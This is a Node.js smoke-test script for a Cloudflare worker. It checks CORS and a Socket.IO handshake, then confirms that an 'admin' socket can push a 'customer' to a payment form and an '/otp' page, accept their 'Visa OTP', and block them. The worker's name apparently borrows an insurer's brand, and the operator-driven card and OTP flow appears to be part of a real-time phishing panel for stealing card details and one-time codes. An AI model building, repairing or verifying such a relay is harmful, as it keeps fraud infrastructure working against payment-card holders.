// Post-deploy smoke test: node scripts/verify.mjs [worker-url]
import { io } from "socket.io-client";
const base = process.argv[2] || "https://gosuksa-edge.bcare.workers.dev";
const origin = "https://gosuksa-tmin.lovable.app";

async function check(label, run) {
  try {
    const ok = await run();
    console.log(`${ok ? "PASS" : "FAIL"}  ${label}`);
    return ok;
  } catch (err) {
    console.log(`FAIL  ${label} — ${err.message}`);
    return false;
  }
}

let allOk = true;

allOk &= await check("GET /breinit returns 200", async () => {
  const res = await fetch(`${base}/breinit`, { headers: { Origin: origin } });
  console.log("      status:", res.status, "body:", (await res.text()).slice(0, 120));
  return res.status === 200;
});

allOk &= await check(`CORS allows ${origin}`, async () => {
  const res = await fetch(`${base}/breinit`, {
    method: "OPTIONS",
    headers: {
      Origin: origin,
      "Access-Control-Request-Method": "POST",
      "Access-Control-Request-Headers": "content-type",
    },
  });
  const allow = res.headers.get("access-control-allow-origin");
  console.log("      access-control-allow-origin:", allow);
  return allow === origin;
});

allOk &= await check("CORS blocks an unlisted origin", async () => {
  const res = await fetch(`${base}/breinit`, {
    method: "OPTIONS",
    headers: { Origin: "https://not-allowed.example", "Access-Control-Request-Method": "GET" },
  });
  return res.headers.get("access-control-allow-origin") === null;
});

allOk &= await check("Socket.IO polling handshake", async () => {
  const res = await fetch(`${base}/socket.io/?EIO=4&transport=polling`, {
    headers: { Origin: origin },
  });
  const body = await res.text();
  console.log("      status:", res.status, "upgrades:", /websocket/.test(body));
  return res.status === 200 && /websocket/.test(body);
});

allOk &= await check("Admin actions relay to the intended customer", async () => {
  const id = `verify-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const options = {
    transports: ["websocket"],
    extraHeaders: { Origin: origin },
    reconnection: false,
    timeout: 10000,
  };
  const customer = io(base, options);
  const admin = io(base, options);
  const received = [];
  for (const event of ["payment:action", "admin:redirect", "user:blocked", "otp:action"])
    customer.on(event, (payload) => received.push({ event, payload }));

  try {
    await Promise.all(
      [customer, admin].map(
        (socket) =>
          new Promise((resolve, reject) => {
            socket.once("connect", resolve);
            socket.once("connect_error", reject);
          }),
      ),
    );
    customer.emit("user:join", { userType: "client", userId: id, userInfo: { uuid: id } });
    admin.emit("join", { role: "admin" });
    await new Promise((resolve) => setTimeout(resolve, 300));

    const actions = [
      ["acceptPaymentForm", { id }],
      ["adminRedirect", { uuid: id, page: "/otp", pageName: "OTP" }],
      ["acceptVisaOtp", { targetUserId: id }],
      ["clientBlocked", { userId: id, message: "blocked" }],
    ];
    for (const [event, payload] of actions) {
      await new Promise((resolve, reject) =>
        admin.timeout(3000).emit(event, payload, (error, response) =>
          error || !response?.ok ? reject(error || new Error(`${event} rejected`)) : resolve(),
        ),
      );
    }
    await new Promise((resolve) => setTimeout(resolve, 500));
    const expected = ["payment:action", "admin:redirect", "user:blocked", "otp:action"];
    return expected.every(
      (event) => received.filter((entry) => entry.event === event).length === 1,
    );
  } finally {
    customer.close();
    admin.close();
  }
});

process.exit(allOk ? 0 : 1);
